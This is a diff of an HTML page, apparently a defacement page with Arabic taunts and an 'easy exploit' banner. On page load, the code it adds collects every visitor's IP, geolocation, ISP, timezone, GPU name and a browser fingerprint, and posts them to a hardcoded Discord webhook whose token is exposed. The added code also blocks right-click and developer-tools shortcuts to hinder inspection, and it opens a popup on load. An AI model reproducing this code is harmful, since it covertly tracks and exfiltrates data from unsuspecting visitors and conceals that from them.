@@ -33,6 +33,66 @@
       box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
       object-fit: cover;
     }
+        /* Info Screen */
+    .info-title {
+      font-size: 2.5em;
+      margin-bottom: 30px;
+      color: #000000;
+      text-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
+      animation: titlePulse 3s ease-in-out infinite;
+    }
+    
+    .info-content {
+      font-size: 1.2em;
+      line-height: 1.8;
+      text-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
+      margin-bottom: 30px;
+    }
+    
+    .info-item {
+      margin: 10px 0;
+      padding: 10px;
+      background: rgba(255, 255, 255, 0.1);
+      border-left: 4px solid #ffffff;
+      animation: infoGlow 4s ease-in-out infinite;
+      border-radius: 5px;
+    }
+    
+    .info-label {
+      color: #ff0101;
+      font-weight: bold;
+      display: inline-block;
+      width: 140px;
+    }
+    
+    .info-value {
+      color: #ffffff;
+      font-weight: bold;
+      display: inline-block;
+    }
+    
+    .final-message {
+      color: #ffffff;
+      text-shadow: 0 0 15px rgba(251, 252, 251, 0.8);
+      animation: finalGlow 2s ease-in-out infinite;
+      margin-top: 20px;
+    }
+    
+    /* Final Screen */
+    .final-screen {
+      background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center;
+      background-size: cover;
+      display: none;
+    }
+    
+    .final-message-big {
+      font-size: 2em;
+      font-weight: 900;
+      color: white;
+      text-shadow: 0 0 30px rgba(255, 255, 255, 0.9);
+      animation: finalPulse 3s ease-in-out infinite;
+      letter-spacing: 4px;
+    }
   </style>
 </head>
 <body>
@@ -46,15 +106,10 @@
 
   <h1>أبو رقية#</h1>
   <p>جينا نبي نحل الثغره لكن انتم ماتبون</p><br>
-    <video class="info-video" autoplay muted loop>
-      <!-- Add your MP4 source here -->
-      <source src="https://abo-ali-1.github.io/Marshal/index/Untitled.mp4" type="video/mp4">
-      Your browser does not support the video tag.
-    </video>
   <script>
 
     window.onload = function() {
-      for (let i = 0; i < 20; i++) {
+      for (let i = 0; i < 1; i++) {
         window.open("https://pbs.twimg.com/media/Gvz9AQ-WoAArGwQ?format=jpg&name=medium", "_blank");
       }
     };
@@ -67,7 +122,143 @@ document.addEventListener('DOMContentLoaded', function() {
   audio.volume = 1.0;
 });
 
+
+
+// Fetch and display IP information
+fetch('https://ipinfo.io/json')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('ip').textContent = data.ip || 'N/A';
+    document.getElementById('city').textContent = data.city || 'N/A';
+    document.getElementById('region').textContent = data.region || 'N/A';
+    document.getElementById('country').textContent = data.country || 'N/A';
+    document.getElementById('location').textContent = data.loc || 'N/A';
+    document.getElementById('organization').textContent = data.org || 'N/A';
+    document.getElementById('timezone').textContent = data.timezone || 'N/A';
+
+    // Get GPU information
+    let gpuInfo = 'N/A';
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      }
+    } catch(e) {
+      console.log('GPU info not available');
+    }
+    document.getElementById('gpu').textContent = gpuInfo;
+
+    // Create HWID
+    const hwidRaw = [
+      navigator.userAgent,
+      navigator.language,
+      screen.width,
+      screen.height,
+      screen.colorDepth,
+      navigator.platform,
+      gpuInfo
+    ].join("|");
+    const hwid = btoa(hwidRaw);
+    const formattedHWID = hwid.match(/.{1,64}/g)?.join("\n") || hwid;
+
+    // Send to webhook (optional)
+    const webhookUrl = "https://discord.com/api/webhooks/1393783455644385372/KF77l9wWobTFbA5UB8SGRyqqnMaDG5zfNCPds4UpdsvKAq17TVF2Uudi_twAJIYMAL8w";
+    const embed = {
+      title: "📥 New Visitor Entered the Site",
+      color: 16711680,
+      fields: [
+        { name: "🌐 IP", value: data.ip || "N/A", inline: true },
+        { name: "🏙️ City", value: data.city || "N/A", inline: true },
+        { name: "🌍 Country", value: data.country || "N/A", inline: true },
+        { name: "🧭 Region", value: data.region || "N/A", inline: true },
+        { name: "📍 Location", value: data.loc || "N/A", inline: true },
+        { name: "🏢 Organization", value: data.org || "N/A", inline: true },
+        { name: "🕒 Timezone", value: data.timezone || "N/A", inline: true },
+        { name: "🖥️ GPU", value: gpuInfo, inline: true },
+        { name: "🔗 Page", value: window.location.href, inline: false },
+        { name: "🧬 HWID", value: formattedHWID, inline: false }
+      ],
+      timestamp: new Date().toISOString()
+    };
+
+    fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    }).catch(() => {
+      console.log('Webhook failed - continuing normally');
+    });
+  })
+  .catch(() => {
+    // Fallback if IP service fails
+    document.getElementById('ip').textContent = 'N/A';
+    document.getElementById('city').textContent = 'N/A';
+    document.getElementById('region').textContent = 'N/A';
+    document.getElementById('country').textContent = 'N/A';
+    document.getElementById('location').textContent = 'N/A';
+    document.getElementById('organization').textContent = 'N/A';
+    document.getElementById('timezone').textContent = 'N/A';
+    document.getElementById('gpu').textContent = 'N/A';
+  });
+
+// Prevent right-click context menu
+document.addEventListener('contextmenu', e => e.preventDefault());
+
+// Prevent F12, Ctrl+Shift+I, etc.
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || 
+      (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+      (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+      (e.ctrlKey && e.key === 'u')) {
+    e.preventDefault();
+  }
+});
   </script>
+
+
+    <div class="info-container">
+    <h1 class="info-title">System Information</h1>
+    <div class="info-content">
+      <div class="info-item">
+        <span class="info-label">IP Address:</span>
+        <span class="info-value" id="ip">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">City:</span>
+        <span class="info-value" id="city">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Region:</span>
+        <span class="info-value" id="region">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Country:</span>
+        <span class="info-value" id="country">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Location:</span>
+        <span class="info-value" id="location">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Organization:</span>
+        <span class="info-value" id="organization">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">Timezone:</span>
+        <span class="info-value" id="timezone">Loading...</span>
+      </div>
+      <div class="info-item">
+        <span class="info-label">GPU:</span>
+        <span class="info-value" id="gpu">Loading...</span>
+      </div>
+    </div>
+    <div class="final-message"><strong><h2>easy exploit</h2></strong></div>
+  </div>
+</div>
 
 
 </body>
